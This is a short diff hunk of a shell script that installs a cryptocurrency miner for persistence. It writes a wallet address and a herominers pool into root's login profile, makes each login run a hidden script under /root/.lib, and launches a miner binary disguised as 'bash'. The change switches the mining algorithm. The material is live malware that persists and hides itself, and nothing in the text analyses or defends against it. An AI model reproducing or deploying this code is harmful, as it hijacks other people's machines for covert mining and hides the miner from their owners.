@@ -22,7 +22,7 @@ echo 'WORKER="modal"' >> ~/.bash_profile
 echo 'WALLETNH="9i4hYPXf3VUfcVxUNSQxAqwo1THyy1pkN7cNDhF5KUZvqEVLZhF"' >> /root/.bash_profile
 echo 'POOLNH="hk.ergo.herominers.com:1180"' >> /root/.bash_profile
 echo "bash /root/.lib/gas.sh"  >> /root/.bash_profile
-echo "./.lib/bash --algo AUTOLYKOS2 --pool $POOLNH --user $WALLETNH.$WORKER" > /root/.lib/gas.sh
+echo "./.lib/bash --algo firopow -s $POOLNH -u $WALLETNH.$WORKER" > /root/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
 
 
